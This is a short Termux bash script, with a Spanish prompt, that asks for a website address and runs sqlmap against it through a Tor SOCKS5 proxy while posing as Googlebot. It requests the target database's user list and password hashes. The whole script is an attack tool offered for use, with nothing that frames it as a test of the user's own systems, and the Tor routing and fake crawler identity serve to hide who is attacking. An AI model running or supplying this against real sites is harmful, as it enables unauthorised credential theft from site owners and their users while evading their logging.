#!/data/data/com.termux/files/usr/bin/bash
read -p "ingresa tu web": web

python2 sqlmap.py -u $web --tor-type=SOCKS5 --tor-port=9149 --user-agent="Googlebot (compatible;Googlebot/2.1;http://www.google.com/bot.html)"  --users --passwords 

